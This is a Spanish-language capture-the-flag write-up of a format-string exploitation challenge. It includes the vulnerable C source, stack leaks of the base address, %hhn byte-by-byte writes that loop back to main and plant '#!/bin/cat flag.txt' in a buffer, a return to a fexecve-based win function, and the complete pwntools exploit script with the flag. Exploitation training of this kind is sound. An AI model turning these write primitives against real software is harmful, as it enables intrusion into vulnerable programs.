# FSWned

## Analisis

```
checksec --file=main
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   51 Symbols	  No	0		2		main
```

El binario no tiene ninguna propiedad explotable, veamos el codigo fuente, main:

``` C
int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

Llama a vuln() que acepta dos entradas de usuario y tiene una vulnerabilidad de cadena formateada:
``` C
void vuln() {
    char first_name[28];
    char last_name[28];

    void **hint =
        (void **)((char *)__builtin_frame_address(0) + sizeof(void *));

    printf("Enter your first name: ");
    fgets(first_name, sizeof(first_name), stdin);
    first_name[strcspn(first_name, "\n")] = '\0';

    printf("You entered ");
    printf(first_name);
    printf("\n");

    printf("Enter your last name: ");
    fgets(last_name, sizeof(last_name), stdin);
    last_name[strcspn(last_name, "\n")] = '\0';

    printf("You entered ");
    printf(last_name);
    printf("\n");
}
```

```
./main
Enter your first name: %p
You entered 0x7fffb8cb5df0
Enter your last name: %x
You entered b8cb5df0
```

Una introduccion recomendable a esta vulnerabilidad puede encontrarse [aqui](https://axcheron.github.io/exploit-101-format-strings/)

Finalmente tenemos una funcion win que usa `memfd_create` para crear un fichero anonimo en memoria. Luego copia el contenido del arreglo buffer hacia el archivo y lo ejecuta:
``` C
char buffer[152];

void win() {
    int fd = memfd_create("payload", 0);
    if (fd == -1) {
        perror("memfd_create");
        exit(1);
    }
    if (write(fd, buffer, 148) != 148) {
        perror("write");
        exit(1);
    }
    char *const args[] = {NULL};
    char *const envp[] = {NULL};
    fexecve(fd, args, envp);
    perror("fexecve");
    exit(1);
}
```

## Filtrado y calculo de direcciones

Depurando el programa con Radare si colocamos un breakpoint antes del segundo `printf` (*main + 173) de `vuln` encontramos que el elemento en la posicion 23 desde el tope de la pila (recordar que los primeros 5 parametros se extraen de los registros) es la direccion de retorno a main:

![2025-04-18-133359_573x683_scrot](https://github.com/user-attachments/assets/199378f5-890e-43b1-bbad-0e025c0fbd37)

Con la direccion de main y el offset podemos obtener la direccion base del binario:
```
nm main| grep main
                 U __libc_start_main@GLIBC_2.34
000000000000147b T main
```

``` python
from pwn import *

elf = context.binary = ELF("./main")
#context.log_level = 'debug'
io = process('./main')

# Leak base address
io.sendlineafter(b"first name: ", b"%23$p")
io.recvuntil(b"You entered ")
leaks = io.recvline().strip()
base_addr = int(leaks,16) - 0x0000147b
elf.address = base_addr
```

## Obtener entradas infinitas

El 7mo parametro de la funcion (segundo de la pila) contiene la direccion de retorno de vuln (main+58)

![2025-04-18-135144_415x366_scrot](https://github.com/user-attachments/assets/8a00c2d1-bafd-4d75-8ae0-2c1f47ee8512)

Si cambiamos el ultimo byte podemos retornar al inicio de main y volver a llamar a vuln() consiguiendo entradas infinitas:

``` python
# ret2main
main_last_byte = 0x7b
payload = f"%{main_last_byte}c%7$hhn".encode().ljust(16,b"\x00")
io.sendline(payload)
```

## Escribir el shellcode
La funcion `fexecve` bien ejecuta el archivo si este contiene shellcode (assembly), o comandos si este comienza comienza con un shebang (!#).

Con escribir `#!/bin/cat flag.txt` basta para conseguir la bandera

Necesitamos calcular la direccion del buffer y con nuestras entradas infinitas podremos escribir un byte a la vez:
```
nm main| grep buffer
0000000000004040 B buffer
```

```python
# write shellcode
command = b'#!/bin/cat flag.txt'
buffer = elf.address + 0x4040
for i in range(len(command)):
    io.recvuntil(b'first name')

    payload = f"%{main_last_byte}c%7$hhn".encode().ljust(16,b"\x00")
    payload += p64(buffer+i)
    io.sendline(payload)
    payload = b'%' + f"{command[i]}".encode() + b'c'
    payload += b'%10$hhn'
    io.sendline(payload)
```

Usamos la primera entrada para volver a main y especificar la direccion a escribir y la segunda entrada para escribir un byte del comando en el buffer

## Retornar a win

Tal y como retornamos a main, ahora retornaremos a win para ejecutar nuestro codigo:
``` python
# ret2win
io.recvuntil(b'first name: ')
win_bytes = elf.sym.win & 0xFFFF
payload = f"%{win_bytes}c%7$hn".encode()
io.sendline(payload)
io.interactive()
```

## Solucion final
``` python
from pwn import *

elf = context.binary = ELF("./main")
#context.log_level = 'debug'
io = process('./main')

# Leak base address
io.sendlineafter(b"first name: ", b"%23$p")
io.recvuntil(b"You entered ")
leaks = io.recvline().strip()
base_addr = int(leaks,16) - 0x0000147b
elf.address = base_addr

# ret2main
main_last_byte = 0x7b
payload = f"%{main_last_byte}c%7$hhn".encode().ljust(16,b"\x00")
io.sendline(payload)

# write shellcode
command = b'#!/bin/cat flag.txt'
buffer = elf.address + 0x4040
for i in range(len(command)):
    io.recvuntil(b'first name')

    payload = f"%{main_last_byte}c%7$hhn".encode().ljust(16,b"\x00")
    payload += p64(buffer+i)
    io.sendline(payload)
    payload = b'%' + f"{command[i]}".encode() + b'c'
    payload += b'%10$hhn'
    io.sendline(payload)

# ret2win
io.recvuntil(b'first name: ')
win_bytes = elf.sym.win & 0xFFFF
payload = f"%{win_bytes}c%7$hn".encode()
io.sendline(payload)
io.interactive()
```

`Breach{5h0uldv3_l1573n3d_70_7h3_6cc_w4rn1n65}`
